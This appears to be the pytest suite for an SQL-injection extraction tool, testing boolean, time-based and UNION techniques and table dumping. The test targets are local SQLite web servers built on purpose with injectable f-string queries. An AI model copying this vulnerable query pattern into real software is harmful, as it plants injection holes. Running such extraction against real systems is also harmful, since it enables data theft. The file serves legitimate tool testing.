import re
import sqlite3
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlsplit

from hickok import http, sqli


class _FakeOracle:
    """Answers `(expr) > n` / `(expr) >= n` for a known value, so the binary
    search can be tested without a server."""

    def __init__(self, resolver):
        self.resolver = resolver   # cond -> the integer being compared
        self.count = 0

    def ask(self, cond: str) -> bool:
        self.count += 1
        op, n = re.search(r"(>=|>)\s*(\d+)\s*$", cond).groups()
        val = self.resolver(cond)
        return val > int(n) if op == ">" else val >= int(n)


def test_extract_int_binary_search():
    o = _FakeOracle(lambda cond: 31337)
    assert sqli.extract_int(o, "whatever") == 31337


def test_extract_str_reads_each_char():
    secret = "s3cr3t!"
    prof = sqli._PROFILES["sqlite"]

    def resolver(cond):
        if "length(" in cond.lower():
            return len(secret)
        i = int(re.search(r",\s*(\d+)\s*,\s*1", cond).group(1))   # substr((q),i,1)
        return ord(secret[i - 1]) if 1 <= i <= len(secret) else 0

    assert sqli.extract_str(_FakeOracle(resolver), prof, "(SELECT password ...)") == secret


def test_profiles_cover_each_dbms_with_the_same_shape():
    keys = set(sqli._PROFILES["sqlite"])
    for name, prof in sqli._PROFILES.items():
        assert set(prof) == keys, f"{name} profile is missing keys"
    assert {"sqlite", "mysql", "mssql", "postgres"} <= set(sqli._PROFILES)


def _reflecting_sqlite_server():
    """A tiny app: SELECT a,b FROM t WHERE a='<id>', reflected — UNION-injectable."""
    db = sqlite3.connect(":memory:", check_same_thread=False)
    db.executescript("CREATE TABLE t (a TEXT, b TEXT);"
                     "INSERT INTO t VALUES ('x1','y1'),('x2','y2');")
    lock = threading.Lock()

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            raw = (parse_qs(urlsplit(self.path).query).get("id") or ["x1"])[0]
            try:
                with lock:
                    row = db.execute(f"SELECT a, b FROM t WHERE a = '{raw}'").fetchone()
            except Exception:
                row = None
            body = (f"<h1>{row[0]}</h1><p>{row[1]}</p>" if row else "none").encode()
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def _small_diff_server():
    """A big static page whose only change on a true vs false condition is a single
    line ("WELCOME BACK" / "INVALID LOGIN") — a boolean tell that's a tiny fraction
    of the response, the case a fixed similarity cutoff misses. Numeric injection,
    no reflection of data."""
    db = sqlite3.connect(":memory:", check_same_thread=False)
    db.executescript("CREATE TABLE u (id INTEGER, secret TEXT); INSERT INTO u VALUES (1, 'PASS');")
    lock = threading.Lock()
    pad = "the deadwood telegraph and trust company ledger. " * 40   # bulk up the page

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            raw = (parse_qs(urlsplit(self.path).query).get("id") or ["1"])[0]
            try:
                with lock:
                    row = db.execute(f"SELECT secret FROM u WHERE id={raw}").fetchone()
            except Exception:
                row = None
            tell = "WELCOME BACK" if row else "INVALID LOGIN"
            body = f"<html><body><div>{pad}</div><p>{tell}</p><div>{pad}</div></body></html>".encode()
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def test_calibrate_finds_a_small_tell_in_a_big_page():
    """A one-line boolean differential in a large page must still calibrate (it was
    missed by the old fixed 0.95 similarity cutoff), and extract correctly."""
    srv = _small_diff_server()
    port = srv.server_address[1]
    net = http.Http(timeout=5)
    oracle = sqli.calibrate(net, f"http://127.0.0.1:{port}/?id=1", "id", "1")
    assert oracle is not None                      # the tiny tell is found
    assert oracle.ask("1=1") and not oracle.ask("1=2")
    out = sqli.extract_str(oracle, sqli._PROFILES["sqlite"], "SELECT secret FROM u WHERE id=1")
    srv.shutdown()
    assert out == "PASS"


def _quote_stripping_server():
    """A boolean differential where the app strips quotes from input (a common
    filter). Calibration must still confirm the oracle — its confirm conditions
    have to be quote-free, or a quote-stripping target falls back to slow time."""
    db = sqlite3.connect(":memory:", check_same_thread=False)
    db.executescript("CREATE TABLE u (id INTEGER, secret TEXT); INSERT INTO u VALUES (1, 'PASS');")
    lock = threading.Lock()
    pad = "deadwood trust ledger row. " * 40

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            raw = (parse_qs(urlsplit(self.path).query).get("id") or ["1"])[0]
            cleaned = raw.replace("'", "").replace('"', "")          # the quote filter
            try:
                with lock:
                    row = db.execute(f"SELECT secret FROM u WHERE id={cleaned}").fetchone()
            except Exception:
                row = None
            tell = "WELCOME BACK" if row else "INVALID LOGIN"
            body = f"<html><body><div>{pad}</div><p>{tell}</p><div>{pad}</div></body></html>".encode()
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def test_calibrate_works_when_quotes_are_stripped():
    """Quote-free confirm conditions mean a quote-stripping filter doesn't defeat
    boolean calibration (it used to, falling back to slow time-based)."""
    srv = _quote_stripping_server()
    net = http.Http(timeout=5)
    oracle = sqli.calibrate(net, f"http://127.0.0.1:{srv.server_address[1]}/?id=1", "id", "1")
    assert oracle is not None
    assert oracle.ask("1=1") and not oracle.ask("1=2")
    srv.shutdown()


def test_calibrate_ignores_a_static_page():
    """A page that never changes (no oracle) must not be mistaken for one."""

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            body = b"<html><body>welcome to the static page</body></html>"
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    net = http.Http(timeout=5)
    oracle = sqli.calibrate(net, f"http://127.0.0.1:{srv.server_address[1]}/?id=1", "id", "1")
    srv.shutdown()
    assert oracle is None


def test_union_walks_and_dumps_a_table():
    srv = _reflecting_sqlite_server()
    port = srv.server_address[1]
    net = http.Http(timeout=5)
    oracle = sqli.calibrate(net, f"http://127.0.0.1:{port}/?id=x1", "id", "x1")
    assert oracle is not None
    setup = sqli.union_setup(net, oracle, "sqlite")
    assert setup == (2, 0)                     # 2 columns, the first is reflected
    dbs = sqli.union_databases(net, oracle, "sqlite", *setup)
    assert "main" in dbs                       # the attached database, read via UNION
    cols = sqli.union_columns(net, oracle, "sqlite", *setup, "t")
    assert cols == ["a", "b"]
    rows = sqli.union_dump(net, oracle, "sqlite", *setup, "t", cols)
    srv.shutdown()
    assert ["x1", "y1"] in rows and ["x2", "y2"] in rows


def _numeric_union_server():
    """A 3-column numeric injection (`SELECT id,name,role ... WHERE id={raw}`) whose
    out-of-range `ORDER BY` error page is *nearly identical* to a normal page — the
    same big table chrome plus one small error line. This is the in-band/UNION case
    (deadwood's First Blood) where the old fixed 0.95 cutoff read the error page as a
    valid column and overshot the column count, so every UNION probe then failed the
    column-count match and the engine wrongly reported no UNION."""
    db = sqlite3.connect(":memory:", check_same_thread=False)
    db.executescript(
        "CREATE TABLE employees (id INTEGER, name TEXT, role TEXT);"
        "INSERT INTO employees VALUES (1,'Wild Bill','Marshal');"
        "CREATE TABLE secrets (label TEXT, value TEXT);"
        "INSERT INTO secrets VALUES ('flag','DEADWOOD{x}');"
    )
    lock = threading.Lock()
    chrome = "<tr><td>deadwood trust staff directory ledger row</td></tr>" * 40

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            raw = (parse_qs(urlsplit(self.path).query).get("id") or ["1"])[0]
            try:
                with lock:
                    rows = db.execute(
                        f"SELECT id, name, role FROM employees WHERE id={raw}").fetchall()
                note = ""
            except Exception as exc:
                rows, note = [], f"<p>query error: {exc}</p>"     # small, in-band leak
            cells = "".join(f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td></tr>" for r in rows)
            body = f"<html><body><table>{chrome}{cells}</table>{note}</body></html>".encode()
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def test_union_setup_does_not_overshoot_when_order_by_error_resembles_base():
    """The column count must stop at the real width (3) even when the out-of-range
    ORDER BY error page is >95% similar to a normal page, and then find a reflected
    column. Regression for the First Blood case where UNION was missed entirely."""
    srv = _numeric_union_server()
    port = srv.server_address[1]
    net = http.Http(timeout=5)
    oracle = sqli.calibrate(net, f"http://127.0.0.1:{port}/?id=1", "id", "1")
    assert oracle is not None and oracle.context == "numeric"
    setup = sqli.union_setup(net, oracle, "sqlite")
    srv.shutdown()
    assert setup is not None, "UNION should be found"
    ncols, refcol = setup
    assert ncols == 3, f"column count overshot: {ncols}"
    assert refcol is not None


def _blind_sleep_server():
    """A totally blind app: same page always, but a true condition can sleep —
    only time-based works here."""
    db = sqlite3.connect(":memory:", check_same_thread=False)
    db.executescript("CREATE TABLE u (id INTEGER); INSERT INTO u VALUES (1);")
    db.create_function("sleep", 1, lambda n: time.sleep(min(float(n), 2)) or 0)
    lock = threading.Lock()

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            raw = (parse_qs(urlsplit(self.path).query).get("id") or ["1"])[0]
            try:
                with lock:
                    db.execute(f"SELECT id FROM u WHERE id = '{raw}'").fetchone()
            except Exception:
                pass
            body = b"<h1>ok</h1>"                  # identical no matter what
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def test_time_based_calibrates_and_answers():
    srv = _blind_sleep_server()
    net = http.Http(timeout=10)
    o = sqli.time_calibrate(net, f"http://127.0.0.1:{srv.server_address[1]}/?id=1", "id", "1", n=1)
    try:
        assert o is not None and o.dbms == "sqlite"
        assert o.ask("1=1") is True        # a true condition sleeps -> over threshold
        assert o.ask("1=2") is False       # a false one stays fast
    finally:
        srv.shutdown()


def _null_union_server():
    """A reflecting, UNION-injectable app whose table has a NULL cell — to prove a NULL
    column doesn't nullify the concatenated row and drop it from the dump."""
    db = sqlite3.connect(":memory:", check_same_thread=False)
    db.executescript("CREATE TABLE t (a TEXT, b TEXT);"
                     "INSERT INTO t VALUES ('x1',NULL),('x2','y2');")
    lock = threading.Lock()

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            raw = (parse_qs(urlsplit(self.path).query).get("id") or ["x1"])[0]
            try:
                with lock:
                    row = db.execute(f"SELECT a, b FROM t WHERE a = '{raw}'").fetchone()
            except Exception:
                row = None
            body = (f"<h1>{row[0]}</h1><p>{row[1]}</p>" if row else "none").encode()
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def test_union_dump_keeps_a_row_with_a_null_cell():
    """A NULL column must not turn the whole concat'd row NULL and drop it from
    group_concat — both rows come back, the NULL rendering as empty."""
    srv = _null_union_server()
    net = http.Http(timeout=5)
    oracle = sqli.calibrate(net, f"http://127.0.0.1:{srv.server_address[1]}/?id=x1", "id", "x1")
    setup = sqli.union_setup(net, oracle, "sqlite")
    rows = sqli.union_dump(net, oracle, "sqlite", *setup, "t", ["a", "b"])
    srv.shutdown()
    assert ["x1", ""] in rows and ["x2", "y2"] in rows


def test_agg_dump_paginates_and_stays_quote_free():
    """The dump reads in row blocks (so MySQL's group_concat_max_len can't silently
    truncate a big table) and reassembles them, with NULL-safe, quote-free cells."""
    marks = sqli._new_marks()
    allrows = [[str(i), f"u{i}"] for i in range(120)]      # 3 blocks: 50 + 50 + 20

    captured = []

    def value_fn(q):
        captured.append(q)
        off = int(re.search(r"OFFSET (\d+)", q).group(1))
        block = allrows[off:off + 50]
        return marks.rowsep.join(marks.colsep.join(r) for r in block)

    out = sqli._agg_dump(value_fn, "mysql", marks, "users", ["id", "name"])
    assert out == allrows                                  # every row, reassembled across blocks
    assert len(captured) == 3
    assert "coalesce" in captured[0] and "'" not in captured[0]    # NULL-safe and quote-free
    assert "LIMIT 50 OFFSET 0" in captured[0] and "OFFSET 50" in captured[1]


def test_agg_dump_stops_on_an_echoing_target():
    """A target that ignores OFFSET and echoes the same block must not loop forever (nor
    silently cap at a magic number) — the dump stops when a block repeats."""
    marks = sqli._new_marks()
    block = [[str(i), f"u{i}"] for i in range(sqli._DUMP_BLOCK)]   # a full, always-identical block
    calls = []

    def value_fn(q):
        calls.append(q)
        return marks.rowsep.join(marks.colsep.join(r) for r in block)

    out = sqli._agg_dump(value_fn, "mysql", marks, "t", ["id", "name"])
    assert out == block                                    # one block kept, not duplicated forever
    assert len(calls) == 2                                 # block 0, then the repeat -> stop


def _paren_sleep_server():
    """Time-blind where the injection sits inside lower('<inj>') — only a ') breakout
    reaches the conditional sleep (numeric / ' / " miss or error), so the calibrator
    must try the paren-single context that union/blind already cover."""
    db = sqlite3.connect(":memory:", check_same_thread=False)
    db.executescript("CREATE TABLE u (id INTEGER, name TEXT); INSERT INTO u VALUES (1,'1');")
    db.create_function("sleep", 1, lambda n: time.sleep(min(float(n), 2)) or 0)
    lock = threading.Lock()

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            raw = (parse_qs(urlsplit(self.path).query).get("id") or ["1"])[0]
            try:
                with lock:                              # the breakout must satisfy name=lower('1')
                    db.execute(f"SELECT id FROM u WHERE name = lower('{raw}')").fetchone()
            except Exception:
                pass                                       # a bad breakout just errors -> no sleep
            body = b"<h1>ok</h1>"
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    srv = HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def test_time_calibrate_tries_the_paren_quote_context():
    """A sink like func('<inj>') only yields to a ') breakout; the time calibrator must
    try that context (it used to test only '', ', " and miss it)."""
    srv = _paren_sleep_server()
    net = http.Http(timeout=10)
    o = sqli.time_calibrate(net, f"http://127.0.0.1:{srv.server_address[1]}/?id=1", "id", "1", n=1)
    try:
        assert o is not None and o.quote == "')"           # found via the paren-single breakout
        assert o.ask("1=1") and not o.ask("1=2")
    finally:
        srv.shutdown()
